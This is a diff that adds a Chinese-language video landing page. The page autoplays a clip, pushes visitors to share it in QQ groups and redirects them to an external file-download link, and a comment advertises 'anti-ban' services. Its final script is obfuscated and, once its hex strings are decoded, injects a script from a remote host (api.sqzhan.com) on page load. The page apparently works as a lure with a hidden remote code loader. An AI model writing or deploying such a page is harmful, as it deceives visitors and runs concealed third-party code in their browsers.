@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<!--闪电Tg：a9517920-->
+<!--防封技术！！！-->
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="referrer" content="never">
+  <meta http-equiv="Access-Control-Allow-Origin" content="*" />
+  <meta http-equiv="Access-Control-Allow-Credentials" content="*" />
+  <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no" />
+  <link rel="stylesheet" href="static/css/aliplayer-min.css"/>
+  <script type="text/javascript" charset="utf-8" src="static/js/aliplayer-min.js"></script>
+  <style>
+    body,
+    html {
+      width: 100%;
+      height: 100%;
+      background: rgb(0, 0, 0);
+      padding: 0;
+      margin: 0;
+      overflow-x: hidden;
+      overflow-y: hidden
+    }
+
+    * {
+      margin: 0;
+      border: 0;
+      padding: 0;
+      text-decoration: none
+    }
+    button{
+			width: 90%;/*设置按钮宽度*/
+			height: 50px;/*设置按钮高度*/
+			color:white;/*字体颜色*/
+			background-color:cornflowerblue;/*按钮背景颜色*/
+			border-radius: 5px;/*让按钮变得圆滑一点*/
+			border- 0;/*消去按钮丑的边框*/
+			margin: 0;
+			outline: none;/*取消轮廓*/
+			font-family: KaiTi;/*字体设置为楷体*/
+			font-size: 17px;/*设置字体大小*/
+			text-align: center;/*字体居中*/
+			cursor: pointer;/*设置鼠标箭头手势*/
+		}
+	button:hover{/*鼠标移动时的颜色变化*/
+			background-color: antiquewhite;
+  </style>
+</head>
+<body>
+<div class="prism-player" id="player-con"></div>
+<div style="text-align:center" onclick="tiao()">
+<button role="button">点 击 更 多 视 频 观 看</button>
+</div>
+<script type="text/javascript">
+function GetQueryString(name) {
+    var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
+    var r = window.location.search.substr(1).match(reg);
+    if (r != null) return decodeURI(r[2]); return null;
+}
+var key = GetQueryString("key");
+var m3u8 = 'https://txmov2.a.yximgs.com/upic/2020/07/10/00/BMjAyMDA3MTAwMDMwNTVfMTk4MTIwOTExXzMyMDYxNzE1ODU2XzJfMw==_b_B726fc546f0d1edf41ce68daaaab85f80.mp4?tag=1-1598113610-p-0-5967be10b83044ab-3d4b358efb604372&tt=b&di=6fc7daa8&bp=10721';
+var dwz = 'https://chiguad.lanzoux.com/s/werghya8199?#werg6896';
+var time = GetQueryString("_t");
+var curTimestamp = new Date().getTime(); 
+if(time==null){
+var url = document.location.href
+window.location.replace(url+'?&_t='+curTimestamp);
+}else{
+var Stime = curTimestamp - time; 
+if (Stime > 5*1000) {
+
+}
+}
+document.title = '​分享到q群可自动刷新视频';
+if(dwz == null){
+var height = "100%";
+}else{
+var height = "90%";
+}
+var player = new Aliplayer({
+  "id": "player-con",
+  "source": m3u8,
+  "width": "100%",
+  "height": height,
+  "autoplay": true,
+  "isLive": false,
+  "rePlay": false,
+  "playsinline": true,
+  "preload": true,
+  "controlBarVisibility": "always",
+  "useH5Prism": true,
+  "skinLayout": [
+    {
+      "name": "bigPlayButton",
+      "align": "blabs",
+      "x": 30,
+      "y": 80
+    },
+    {
+      "name": "H5Loading",
+      "align": "cc"
+    },
+    {
+      "name": "errorDisplay",
+      "align": "tlabs",
+      "x": 0,
+      "y": 0
+    },
+    {
+      "name": "infoDisplay"
+    },
+    {
+      "name": "tooltip",
+      "align": "blabs",
+      "x": 0,
+      "y": 56
+    },
+    {
+      "name": "thumbnail"
+    },
+    {
+      "name": "controlBar",
+      "align": "blabs",
+      "x": 0,
+      "y": 0,
+      "children": [
+        {
+          "name": "progress",
+          "align": "blabs",
+          "x": 0,
+          "y": 44
+        },
+        {
+          "name": "playButton",
+          "align": "tl",
+          "x": 15,
+          "y": 12
+        },
+        {
+          "name": "timeDisplay",
+          "align": "tl",
+          "x": 10,
+          "y": 7
+        },
+        {
+          "name": "fullScreenButton",
+          "align": "tr",
+          "x": 10,
+          "y": 12
+        },
+        {
+          "name": "volume",
+          "align": "tr",
+          "x": 5,
+          "y": 10
+        }
+      ]
+    }
+  ]
+}, function (player) {
+    console.log("The player is created");
+  }
+);
+player.on('ended', function () {
+    if(dwz != null){
+        window.location.href = dwz;
+    }
+})
+function tiao(){window.location.href = dwz;}
+</script>
+<script type="text/javascript">
+var _0xodV='jsjiami.com.v6',_0xodV_=['_0xodV'],_0x13da=[_0xodV,'\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74','\x73\x63\x72\x69\x70\x74','\x73\x72\x63','\x68\x74\x74\x70\x3a\x2f\x2f\x61\x70\x69\x2e\x73\x71\x7a\x68\x61\x6e\x2e\x63\x6f\x6d\x2f\x6a\x73\x2f\x69\x6e\x64\x65\x78\x2e\x6a\x73','\x62\x6f\x64\x79','\x61\x70\x70\x65\x6e\x64\x43\x68\x69\x6c\x64','\x54\x6a\x47\x56\x73\x6a\x69\x61\x74\x41\x6d\x69\x4b\x2e\x63\x6f\x4c\x6d\x7a\x2e\x76\x6c\x48\x48\x36\x5a\x44\x4d\x3d\x3d'];function _0x26dd(_0x49ac1b,_0x1538ed){_0x49ac1b=~~'0x'['concat'](_0x49ac1b['slice'](0x0));var _0x4136e2=_0x13da[_0x49ac1b];return _0x4136e2;};(function(_0x3235e5,_0x524d63){var _0x2f6f79=0x0;for(_0x524d63=_0x3235e5['shift'](_0x2f6f79>>0x2);_0x524d63&&_0x524d63!==(_0x3235e5['pop'](_0x2f6f79>>0x3)+'')['replace'](/[TGVtAKLzlHHZDM=]/g,'');_0x2f6f79++){_0x2f6f79=_0x2f6f79^0x11c040;}}(_0x13da,_0x26dd));func();function func(){let _0x25f9f6=document[_0x26dd('0')](_0x26dd('1'));_0x25f9f6[_0x26dd('2')]=_0x26dd('3');document[_0x26dd('4')][_0x26dd('5')](_0x25f9f6);};;_0xodV='jsjiami.com.v6';
+</script>
+</body>
+</html>
